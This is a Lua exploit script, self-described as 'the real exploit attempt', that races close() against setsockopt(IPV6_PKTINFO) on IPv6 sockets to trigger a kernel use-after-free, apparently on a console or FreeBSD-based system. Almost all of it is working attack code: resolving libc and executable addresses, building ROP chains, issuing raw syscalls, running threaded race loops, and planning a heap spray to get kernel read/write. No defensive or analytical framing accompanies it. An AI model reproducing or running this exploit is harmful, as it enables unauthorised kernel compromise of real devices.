-- CRASH_CLASS: HIGH
-- PROBE 131a: Threaded IPV6 PKTINFO UAF with synchronized race
--
-- This is the real exploit attempt. Uses:
-- - Thrd_create for parallel execution
-- - Mtx_lock/unlock for synchronization
-- - Atomic_fetch_add for coordination flag
-- - native.fcall_with_rax for fast syscalls from thread entry
--
-- Race design:
-- Thread A (main): loops calling setsockopt(IPV6_PKTINFO) on target fd
-- Thread B (spawned): blocks on mutex, then calls close(target_fd) via
--   a ropchain or native function pointer
--
-- The key insight: Thread B's close() frees in6p_outputopts while
-- Thread A's setsockopt reads the pointer → UAF write.
-- After UAF, spray IPv6 sockets to reclaim the freed pktopts with
-- controlled data, giving us kernel read/write.

print("=== PROBE 131a: THREADED IPV6 UAF ===")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_sc(num)
    local sc = {}
    for k, v in pairs(syscall.pipe) do sc[k] = v end
    sc.syscall_no = num
    setmetatable(sc, getmetatable(syscall.pipe))
    return sc
end

local pid = to_num(syscall.getpid())
print("pid=" .. pid)

-- ============================================================
-- PHASE 0: Enumerate available close() wrappers
-- ============================================================
print("")
print("--- PHASE 0: FIND CLOSE FUNCTION ---")

local close_fn_addr = nil
local close_fn_name = nil

-- Search libc_addrofs for anything close-related
for k, v in pairs(libc_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") or ks:find("shut") then
        print("  libc." .. tostring(k) .. " = " .. tostring(v))
        -- Prefer sceKernelClose or close
        if not close_fn_addr or ks == "close" or ks:find("kernelclose") then
            close_fn_addr = v
            close_fn_name = tostring(k)
        end
    end
end

for k, v in pairs(eboot_addrofs) do
    local ks = tostring(k):lower()
    if ks:find("close") then
        print("  eboot." .. tostring(k) .. " = " .. tostring(v))
        if not close_fn_addr then
            close_fn_addr = v
            close_fn_name = "eboot." .. tostring(k)
        end
    end
end

if close_fn_addr then
    print("Using close function: " .. close_fn_name .. " @ " .. tostring(close_fn_addr))
else
    print("No close() wrapper found in addrofs tables")
    print("Will search for syscall;ret stub approach")
end

-- ============================================================
-- PHASE 1: Confirm thread + socket primitives
-- ============================================================
print("")
print("--- PHASE 1: PRIMITIVE CHECK ---")

local has_rax = (native and native.fcall_with_rax) ~= nil
print("native.fcall_with_rax: " .. tostring(has_rax))

local thrd_create_fn = fcall(libc_addrofs.Thrd_create)
local thrd_join_fn = fcall(libc_addrofs.Thrd_join)
local mtx_init_fn = fcall(libc_addrofs.Mtx_init)
local mtx_lock_fn = fcall(libc_addrofs.Mtx_lock)
local mtx_unlock_fn = fcall(libc_addrofs.Mtx_unlock)

-- Verify threading
local thr_buf = memory.alloc(8)
memory.write_qword(thr_buf, 0)
local ok, ret = pcall(thrd_create_fn, thr_buf, gadgets.ret, uint64(0))
print("thread(ret): ok=" .. tostring(ok) .. " ret=" .. tostring(ret))
if ok and to_num(ret) == 0 then
    sleep(0.05, 's')
    pcall(thrd_join_fn, memory.read_qword(thr_buf), uint64(0))
end

-- Verify socket ops via ropchain
local AF_INET6 = 28
local SOCK_DGRAM = 2
local IPPROTO_UDP = 17
local IPPROTO_IPV6 = 41
local IPV6_PKTINFO = 46
local SOL_IPV6 = 41

local sc_socket = make_sc(97)
local sc_close = make_sc(6)
local sc_setsockopt = make_sc(105)
local sc_getsockopt = make_sc(118)

-- Quick socket create+pktinfo+close test
local c1 = ropchain:new()
c1:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
c1:restore_through_longjmp()
c1:execute_through_coroutine()
local test_fd = to_num(memory.read_qword(c1:get_last_retval_addr()))
print("test socket=" .. test_fd)

if test_fd >= 0 then
    local pktinfo_buf = memory.alloc(0x20)
    memory.write_qword(pktinfo_buf, 0)
    memory.write_qword(pktinfo_buf + 8, 0)
    memory.write_dword(pktinfo_buf + 16, 0)

    local c2 = ropchain:new()
    c2:push_syscall_with_ret(sc_setsockopt, test_fd, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo_buf, 0x14)
    c2:restore_through_longjmp()
    c2:execute_through_coroutine()
    print("setsockopt(PKTINFO)=" .. to_num(memory.read_qword(c2:get_last_retval_addr())))

    local c3 = ropchain:new()
    c3:push_syscall_with_ret(sc_close, test_fd)
    c3:restore_through_longjmp()
    c3:execute_through_coroutine()
    print("close=" .. to_num(memory.read_qword(c3:get_last_retval_addr())))
end

print("canary1: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 2: Thread close test (if close_fn found)
-- ============================================================
print("")
print("--- PHASE 2: THREAD CLOSE TEST ---")

if close_fn_addr then
    -- Create socket, then have a thread close it
    local c_s = ropchain:new()
    c_s:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
    c_s:restore_through_longjmp()
    c_s:execute_through_coroutine()
    local sock = to_num(memory.read_qword(c_s:get_last_retval_addr()))
    print("socket for thread close: " .. sock)

    if sock >= 0 then
        local thr2 = memory.alloc(8)
        memory.write_qword(thr2, 0)
        local tok, tret = pcall(thrd_create_fn, thr2, close_fn_addr, uint64(sock))
        print("Thrd_create(close, " .. sock .. "): ok=" .. tostring(tok) .. " ret=" .. tostring(tret))

        if tok and to_num(tret) == 0 then
            sleep(0.1, 's')
            pcall(thrd_join_fn, memory.read_qword(thr2), uint64(0))

            -- Verify socket is closed
            local c_v = ropchain:new()
            c_v:push_syscall_with_ret(sc_setsockopt, sock, IPPROTO_IPV6, IPV6_PKTINFO, memory.alloc(0x20), 0x14)
            c_v:restore_through_longjmp()
            c_v:execute_through_coroutine()
            local v_ret = to_num(memory.read_qword(c_v:get_last_retval_addr()))
            print("setsockopt after thread close: " .. v_ret .. (v_ret == -1 and " (CLOSED!)" or " (still open)"))
        end
    end
else
    print("No close function - testing if Atomic_fetch_add can signal threads")
    -- Alternative approach: use atomic flag to coordinate
    local flag = memory.alloc(8)
    memory.write_qword(flag, 0)
    local atomic_fn = libc_addrofs.Atomic_fetch_add_8
    if atomic_fn then
        print("Atomic_fetch_add_8 available at " .. tostring(atomic_fn))
    end
end

print("canary2: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))

-- ============================================================
-- PHASE 3: Synchronized IPV6 race
-- ============================================================
print("")
print("--- PHASE 3: IPV6 RACE ---")

local RACE_ROUNDS = 100
local pktinfo = memory.alloc(0x20)
local stub = has_rax and syscall.pipe.fn_addr or nil

-- Strategy depends on available primitives
if close_fn_addr then
    print("Mode: Thread close + main setsockopt race")

    for round = 1, RACE_ROUNDS do
        -- Create target socket
        local target
        if has_rax then
            target = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
        else
            local c = ropchain:new()
            c:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
            c:restore_through_longjmp()
            c:execute_through_coroutine()
            target = to_num(memory.read_qword(c:get_last_retval_addr()))
        end
        if target < 0 then print("round " .. round .. ": socket fail"); break end

        -- Set initial pktinfo (allocates pktopts in kernel)
        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)
        if has_rax then
            native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)
        else
            local c = ropchain:new()
            c:push_syscall_with_ret(sc_setsockopt, target, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
            c:restore_through_longjmp()
            c:execute_through_coroutine()
        end

        -- Create mutex for synchronization
        local mtx = memory.alloc(64)
        pcall(mtx_init_fn, mtx, uint64(0))
        pcall(mtx_lock_fn, mtx)

        -- Spawn thread that will: lock mutex (blocks), then close(target)
        -- Problem: thread entry can only call ONE function
        -- If close_fn takes (fd) as arg, that works perfectly
        -- But the thread starts IMMEDIATELY, so we need the mutex to gate it

        -- Actually: Thrd_create(fn, arg) calls fn(arg)
        -- We want: thread blocks on mutex, THEN closes socket
        -- Can't do 2 operations from thread entry...
        --
        -- Simpler: DON'T block. Just launch thread to close(target) and
        -- simultaneously do setsockopt from main. The thread startup
        -- delay IS the race window.

        local thr3 = memory.alloc(8)
        memory.write_qword(thr3, 0)

        -- RACE START: launch close thread + immediately setsockopt
        pcall(thrd_create_fn, thr3, close_fn_addr, uint64(target))

        -- Main thread: immediately setsockopt (RACE!)
        local sso_ret
        if has_rax then
            sso_ret = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))
        else
            local c = ropchain:new()
            c:push_syscall_with_ret(sc_setsockopt, target, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
            c:restore_through_longjmp()
            c:execute_through_coroutine()
            sso_ret = to_num(memory.read_qword(c:get_last_retval_addr()))
        end

        -- Join thread
        sleep(0.02, 's')
        pcall(thrd_join_fn, memory.read_qword(thr3), uint64(0))

        if round <= 5 or sso_ret ~= -1 or round % 20 == 0 then
            print(string.format("round %d: fd=%d sso_after_race=%d%s",
                round, target, sso_ret,
                sso_ret == 0 and " (RACE HIT!)" or ""))
        end

        -- Health check
        if round % 20 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("*** CRASH at round " .. round .. " — possible UAF trigger ***")
                break
            end
        end
    end

elseif has_rax then
    print("Mode: Sequential close+setsockopt via native.fcall_with_rax (no thread close)")
    -- Without a close function for threads, do fast sequential race
    -- The kernel may context-switch between our close and setsockopt calls

    for round = 1, RACE_ROUNDS do
        local target = to_num(native.fcall_with_rax(stub, 97, AF_INET6, SOCK_DGRAM, IPPROTO_UDP))
        if target < 0 then break end

        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)
        native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14)

        -- Close + immediately setsockopt
        native.fcall_with_rax(stub, 6, target)
        local sso = to_num(native.fcall_with_rax(stub, 105, target, IPPROTO_IPV6, IPV6_PKTINFO, to_num(pktinfo), 0x14))

        if round <= 3 or sso ~= -1 or round % 25 == 0 then
            print(string.format("round %d: fd=%d sso=%d", round, target, sso))
        end

        if round % 25 == 0 then
            if not pcall(function() return to_num(syscall.getpid()) end) then
                print("*** CRASH ***"); break
            end
        end
    end

else
    print("Mode: Ropchain sequential race (slowest)")
    for round = 1, 20 do
        local c = ropchain:new()
        c:push_syscall_with_ret(sc_socket, AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
        c:restore_through_longjmp()
        c:execute_through_coroutine()
        local target = to_num(memory.read_qword(c:get_last_retval_addr()))
        if target < 0 then break end

        memory.write_qword(pktinfo, 0)
        memory.write_qword(pktinfo + 8, 0)
        memory.write_dword(pktinfo + 16, 0)

        local c2 = ropchain:new()
        c2:push_syscall_with_ret(sc_setsockopt, target, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
        c2:push_syscall_with_ret(sc_close, target)
        c2:push_syscall_with_ret(sc_setsockopt, target, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, 0x14)
        c2:restore_through_longjmp()
        c2:execute_through_coroutine()
        local last = to_num(memory.read_qword(c2:get_last_retval_addr()))
        print(string.format("round %d: fd=%d last_sso=%d", round, target, last))

        if not pcall(function() return to_num(syscall.getpid()) end) then
            print("*** CRASH ***"); break
        end
    end
end

print("")
print("canary_final: " .. tostring(pcall(function() return to_num(syscall.getpid()) end)))
print("=== PROBE 131a COMPLETE ===")
